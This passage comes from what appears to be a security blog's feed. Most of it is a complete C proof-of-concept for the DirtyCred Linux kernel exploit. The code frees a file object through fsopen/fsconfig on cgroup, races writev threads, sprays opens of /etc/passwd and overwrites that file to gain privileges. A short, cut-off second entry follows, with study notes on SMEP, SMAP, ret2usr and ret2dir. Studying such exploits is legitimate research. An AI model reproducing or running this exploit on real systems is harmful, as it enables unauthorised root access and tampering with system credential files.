class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;endian.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdarg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/resource.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/uio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/bpf.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kcmp.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/capability.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">die</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, ...)</span> &#123;<br>  va_list params;<br><br>  va_start(params, fmt);<br>  <span class="hljs-built_in">vfprintf</span>(<span class="hljs-built_in">stderr</span>, fmt, params);<br>  va_end(params);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">use_temporary_dir</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  system(<span class="hljs-string">&quot;rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data&quot;</span>);<br>  <span class="hljs-type">char</span> *tmpdir = <span class="hljs-string">&quot;exp_dir&quot;</span>;<br>  <span class="hljs-keyword">if</span> (!tmpdir)<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> (chmod(tmpdir, <span class="hljs-number">0777</span>))<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> (chdir(tmpdir))<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">write_file</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *what, ...)</span> &#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];<br>  va_list args;<br>  va_start(args, what);<br>  vsnprintf(buf, <span class="hljs-keyword">sizeof</span>(buf), what, args);<br>  va_end(args);<br>  buf[<span class="hljs-keyword">sizeof</span>(buf) - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(buf);<br>  <span class="hljs-type">int</span> fd = open(file, O_WRONLY | O_CLOEXEC);<br>  <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <span class="hljs-keyword">if</span> (write(fd, buf, len) != len) &#123;<br>    <span class="hljs-type">int</span> err = errno;<br>    close(fd);<br>    errno = err;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  close(fd);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">setup_common</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-keyword">if</span> (mount(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;/sys/fs/fuse/connections&quot;</span>, <span class="hljs-string">&quot;fusectl&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) &#123;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">loop</span><span class="hljs-params">()</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">sandbox_common</span><span class="hljs-params">()</span> &#123;<br>  prctl(PR_SET_PDEATHSIG, SIGKILL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>  setsid();<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rlimit</span> <span class="hljs-title">rlim</span>;</span><br>  rlim.rlim_cur = rlim.rlim_max = (<span class="hljs-number">200</span> &lt;&lt; <span class="hljs-number">20</span>);<br>  setrlimit(RLIMIT_AS, &amp;rlim);<br>  rlim.rlim_cur = rlim.rlim_max = <span class="hljs-number">32</span> &lt;&lt; <span class="hljs-number">20</span>;<br>  setrlimit(RLIMIT_MEMLOCK, &amp;rlim);<br>  rlim.rlim_cur = rlim.rlim_max = <span class="hljs-number">136</span> &lt;&lt; <span class="hljs-number">20</span>;<br>  setrlimit(RLIMIT_FSIZE, &amp;rlim);<br>  rlim.rlim_cur = rlim.rlim_max = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">20</span>;<br>  setrlimit(RLIMIT_STACK, &amp;rlim);<br>  rlim.rlim_cur = rlim.rlim_max = <span class="hljs-number">0</span>;<br>  setrlimit(RLIMIT_CORE, &amp;rlim);<br>  rlim.rlim_cur = rlim.rlim_max = <span class="hljs-number">256</span>;<br>  setrlimit(RLIMIT_NOFILE, &amp;rlim);<br>  <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNS)) &#123;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (mount(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-literal">NULL</span>, MS_REC | MS_PRIVATE, <span class="hljs-literal">NULL</span>)) &#123;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (unshare(CLONE_NEWIPC)) &#123;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (unshare(<span class="hljs-number">0x02000000</span>)) &#123;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (unshare(CLONE_NEWUTS)) &#123;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (unshare(CLONE_SYSVSEM)) &#123;<br>  &#125;<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *value;<br>  &#125; <span class="hljs-type">sysctl_t</span>;<br>  <span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">sysctl_t</span> sysctls[] = &#123;<br>      &#123;<span class="hljs-string">&quot;/proc/sys/kernel/shmmax&quot;</span>, <span class="hljs-string">&quot;16777216&quot;</span>&#125;,<br>      &#123;<span class="hljs-string">&quot;/proc/sys/kernel/shmall&quot;</span>, <span class="hljs-string">&quot;536870912&quot;</span>&#125;,<br>      &#123;<span class="hljs-string">&quot;/proc/sys/kernel/shmmni&quot;</span>, <span class="hljs-string">&quot;1024&quot;</span>&#125;,<br>      &#123;<span class="hljs-string">&quot;/proc/sys/kernel/msgmax&quot;</span>, <span class="hljs-string">&quot;8192&quot;</span>&#125;,<br>      &#123;<span class="hljs-string">&quot;/proc/sys/kernel/msgmni&quot;</span>, <span class="hljs-string">&quot;1024&quot;</span>&#125;,<br>      &#123;<span class="hljs-string">&quot;/proc/sys/kernel/msgmnb&quot;</span>, <span class="hljs-string">&quot;1024&quot;</span>&#125;,<br>      &#123;<span class="hljs-string">&quot;/proc/sys/kernel/sem&quot;</span>, <span class="hljs-string">&quot;1024 1048576 500 1024&quot;</span>&#125;,<br>  &#125;;<br>  <span class="hljs-type">unsigned</span> i;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(sysctls) / <span class="hljs-keyword">sizeof</span>(sysctls[<span class="hljs-number">0</span>]); i++)<br>    write_file(sysctls[i].name, sysctls[i].value);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">wait_for_loop</span><span class="hljs-params">(<span class="hljs-type">int</span> pid)</span> &#123;<br>  <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-type">int</span> status = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> (waitpid(<span class="hljs-number">-1</span>, &amp;status, __WALL) != pid) &#123;<br>  &#125;<br>  <span class="hljs-keyword">return</span> WEXITSTATUS(status);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">drop_caps</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">user_cap_header_struct</span> <span class="hljs-title">cap_hdr</span> =</span> &#123;&#125;;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">user_cap_data_struct</span> <span class="hljs-title">cap_data</span>[2] =</span> &#123;&#125;;<br>  cap_hdr.version = _LINUX_CAPABILITY_VERSION_3;<br>  cap_hdr.pid = getpid();<br>  <span class="hljs-keyword">if</span> (syscall(SYS_capget, &amp;cap_hdr, &amp;cap_data))<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-type">const</span> <span class="hljs-type">int</span> drop = (<span class="hljs-number">1</span> &lt;&lt; CAP_SYS_PTRACE) | (<span class="hljs-number">1</span> &lt;&lt; CAP_SYS_NICE);<br>  cap_data[<span class="hljs-number">0</span>].effective &amp;= ~drop;<br>  cap_data[<span class="hljs-number">0</span>].permitted &amp;= ~drop;<br>  cap_data[<span class="hljs-number">0</span>].inheritable &amp;= ~drop;<br>  <span class="hljs-keyword">if</span> (syscall(SYS_capset, &amp;cap_hdr, &amp;cap_data))<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> real_uid;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> real_gid;<br>__attribute__((aligned(<span class="hljs-number">64</span> &lt;&lt; <span class="hljs-number">10</span>))) <span class="hljs-type">static</span> <span class="hljs-type">char</span> sandbox_stack[<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">20</span>];<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">namespace_sandbox_proc</span><span class="hljs-params">()</span> &#123;<br>  sandbox_common();<br>  loop();<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_sandbox_namespace</span><span class="hljs-params">()</span> &#123;<br>  setup_common();<br>  real_uid = getuid();<br>  real_gid = getgid();<br>  mprotect(sandbox_stack, <span class="hljs-number">4096</span>, PROT_NONE);<br><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-type">int</span> pid =<br>        clone(namespace_sandbox_proc, &amp;sandbox_stack[<span class="hljs-keyword">sizeof</span>(sandbox_stack) - <span class="hljs-number">64</span>],<br>              CLONE_NEWUSER | CLONE_NEWPID, <span class="hljs-number">0</span>);<br>    <span class="hljs-type">int</span> ret_status = wait_for_loop(pid);<br>    <span class="hljs-keyword">if</span> (ret_status == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] succeed\n&quot;</span>);<br>      sleep(<span class="hljs-number">1</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] checking /etc/passwd\n\n&quot;</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] executing command : head -n 5 /etc/passwd\n&quot;</span>);<br>      sleep(<span class="hljs-number">1</span>);<br>      system(<span class="hljs-string">&quot;head -n 5 /etc/passwd&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] failed to write, retry...\n\n&quot;</span>);<br>      sleep(<span class="hljs-number">3</span>);<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ===========================</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_FILE_NUM 1000</span><br><span class="hljs-type">int</span> uaf_fd;<br><span class="hljs-type">int</span> fds[MAX_FILE_NUM];<br><br><span class="hljs-type">int</span> run_write = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> run_spray = <span class="hljs-number">0</span>;<br><span class="hljs-type">char</span> *cwd;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">slow_write</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] start slow write to get the lock\n&quot;</span>);<br>  <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;./uaf&quot;</span>, <span class="hljs-number">1</span>);<br><br>  <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>    perror(<span class="hljs-string">&quot;error open uaf file&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  &#125;<br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> addr = <span class="hljs-number">0x30000000</span>;<br>  <span class="hljs-type">int</span> offset;<br>  <span class="hljs-keyword">for</span> (offset = <span class="hljs-number">0</span>; offset &lt; <span class="hljs-number">0x80000</span>; offset++) &#123;<br>    <span class="hljs-type">void</span> *r = mmap((<span class="hljs-type">void</span> *)(addr + offset * <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x1000</span>,<br>                   PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (r &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;allocate failed at 0x%x\n&quot;</span>, offset);<br>    &#125;<br>  &#125;<br><br>  assert(offset &gt; <span class="hljs-number">0</span>);<br><br>  <span class="hljs-type">void</span> *mem = (<span class="hljs-type">void</span> *)(addr);<br>  <span class="hljs-built_in">memcpy</span>(mem, <span class="hljs-string">&quot;hhhhh&quot;</span>, <span class="hljs-number">5</span>);<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>[5];</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>    iov[i].iov_base = mem;<br>    iov[i].iov_len = (offset - <span class="hljs-number">1</span>) * <span class="hljs-number">0x1000</span>;<br>  &#125;<br><br>  run_write = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> (writev(fd, iov, <span class="hljs-number">5</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>    perror(<span class="hljs-string">&quot;slow write&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] write done!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">write_cmd</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> data[<span class="hljs-number">1024</span>] = <span class="hljs-string">&quot;\nDirtyCred works!\n\n&quot;</span>;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span> =</span> &#123;.iov_base = data, .iov_len = <span class="hljs-built_in">strlen</span>(data)&#125;;<br><br>  <span class="hljs-keyword">while</span> (!run_write) &#123;<br>  &#125;<br>  run_spray = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> (writev(uaf_fd, &amp;iov, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;failed to write\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] overwrite done! It should be after the slow write\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spray_files</span><span class="hljs-params">()</span> &#123;<br><br>  <span class="hljs-keyword">while</span> (!run_spray) &#123;<br>  &#125;<br>  <span class="hljs-type">int</span> found = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] got uaf fd %d, start spray....\n&quot;</span>, uaf_fd);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_FILE_NUM; i++) &#123;<br>    fds[i] = open(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fds[i] &lt; <span class="hljs-number">0</span>) &#123;<br>      perror(<span class="hljs-string">&quot;open file&quot;</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, fds[i]) ==<br>        <span class="hljs-number">0</span>) &#123;<br>      found = <span class="hljs-number">1</span>;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] found, file id %d\n&quot;</span>, i);<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++)<br>        close(fds[j]);<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (found) &#123;<br>    sleep(<span class="hljs-number">4</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigger</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">int</span> fs_fd = syscall(__NR_fsopen, <span class="hljs-string">&quot;cgroup&quot;</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>    perror(<span class="hljs-string">&quot;fsopen&quot;</span>);<br>    die(<span class="hljs-string">&quot;&quot;</span>);<br>  &#125;<br><br>  symlink(<span class="hljs-string">&quot;./data&quot;</span>, <span class="hljs-string">&quot;./uaf&quot;</span>);<br><br>  uaf_fd = open(<span class="hljs-string">&quot;./uaf&quot;</span>, <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> (uaf_fd &lt; <span class="hljs-number">0</span>) &#123;<br>    die(<span class="hljs-string">&quot;failed to open symbolic file\n&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (syscall(__NR_fsconfig, fs_fd, <span class="hljs-number">5</span>, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-number">0</span>, uaf_fd)) &#123;<br>    perror(<span class="hljs-string">&quot;fsconfig&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  &#125;<br>  <span class="hljs-comment">// free the uaf fd</span><br>  close(fs_fd);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">loop</span><span class="hljs-params">()</span> &#123;<br>  trigger();<br><br>  <span class="hljs-type">pthread_t</span> p_id;<br>  pthread_create(&amp;p_id, <span class="hljs-literal">NULL</span>, slow_write, <span class="hljs-literal">NULL</span>);<br><br>  <span class="hljs-type">pthread_t</span> p_id_cmd;<br>  pthread_create(&amp;p_id_cmd, <span class="hljs-literal">NULL</span>, write_cmd, <span class="hljs-literal">NULL</span>);<br>  <span class="hljs-built_in">exit</span>(spray_files());<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  cwd = get_current_dir_name();<br>  syscall(__NR_mmap, <span class="hljs-number">0x1ffff000u</span>l, <span class="hljs-number">0x1000u</span>l, <span class="hljs-number">0ul</span>, <span class="hljs-number">0x32u</span>l, <span class="hljs-number">-1</span>, <span class="hljs-number">0ul</span>);<br>  syscall(__NR_mmap, <span class="hljs-number">0x20000000u</span>l, <span class="hljs-number">0x1000000u</span>l, <span class="hljs-number">7ul</span>, <span class="hljs-number">0x32u</span>l, <span class="hljs-number">-1</span>, <span class="hljs-number">0ul</span>);<br>  syscall(__NR_mmap, <span class="hljs-number">0x21000000u</span>l, <span class="hljs-number">0x1000u</span>l, <span class="hljs-number">0ul</span>, <span class="hljs-number">0x32u</span>l, <span class="hljs-number">-1</span>, <span class="hljs-number">0ul</span>);<br>  use_temporary_dir();<br>  do_sandbox_namespace();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Security Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>System Security</tag>
      
      <tag>DirtyCred</tag>
      
      <tag>linux</tag>
      
      <tag>Kernel</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Architectural Support for System Security</title>
    <link href="/2021/11/30/Architectural-Support-for-System-Security/"/>
    <url>/2021/11/30/Architectural-Support-for-System-Security/</url>
    
    <content type="html"><![CDATA[<h1 id="architectural-support-for-system-security">Architectural Supportfor System Security</h1><p>Hardware Features, Usage and Scenarios</p><p>performance counter性能监视器用来做安全</p><h2 id="security-why-hardware">Security: Why Hardware?</h2><p>Security is a negative goal</p><ul><li>how to make a program not do something?</li><li>not execute any code from user, not leak some secret from memory,etc</li></ul><p>Hardware features based security:</p><ul><li>fixed and robust(hopefully)健壮</li><li>more efficient(most of thetime)比较好地提高并行能力，减少CPU的开销</li></ul><h2 id="features-designed-for-security">Features designed forSecurity</h2><h3 id="smep-smap">SMEP &amp; SMAP</h3><h4 id="return-to-user-attack">Return-to-user Attack</h4><p>利用了用户空间进程不能访问内核空间，但内核空间能访问用户空间这个特性来定向内核代码或数据流指向用户软件，以ring0特权执行用户空间代码完成提升权限</p><h4 id="smep">SMEP</h4><p>Supervisor Mode Execution Prevention</p><ul><li>allows pages to be protected from supervisor-mode instructionfetches</li><li>if SMEP = 1, OS cannot fetch instructions from applications</li></ul><p>保护页面免受supervisor模式提取指令</p><p>Prevent Return-to-user Attack: the CPU will prevent the OS fromexecuting user-level instructions</p><h4 id="smap">SMAP</h4><p>supervisor mode access prevention</p><ul><li>allows pages to be protected from supervisor-mode data accesses</li><li>if SMAP = 1, OS cannot access data at linear addresses ofapplication</li></ul><p>早期内核和用户态是一张页表，防止内核去访问用户态内存</p><h4 id="ret2dir-attacks">ret2dir Attacks</h4><p>return-to-direct-mapped memoryattack简单来说，通过利用一个核心区域，直接映射系统部分或者全部物理内存(用户空间内存映射到physmap,内核可以直接访问physmap)允许攻击者在内核地址空间访问用户数据</p><p>physmap在0xffff888000000000 -0xfffc87fffffffff这一段，大小为64TB,物理内存直接映射在该区域某地址处</p><p>内存分配主要有kmalloc和vmalloc两种方式：</p><ul><li>vmalloc请求pagesize倍数大小的内存，要求虚拟地址连续，物理地址不需要连续</li><li>kmalloc请求字节级内存分配，虚拟地址和物理地址都必须是连续的，可以在physmap上做内存分配操作</li></ul><p>physmap和RAM是直接映射关系，可以通过kmalloc分配的内存地址找到physmap的基址。</p><h4 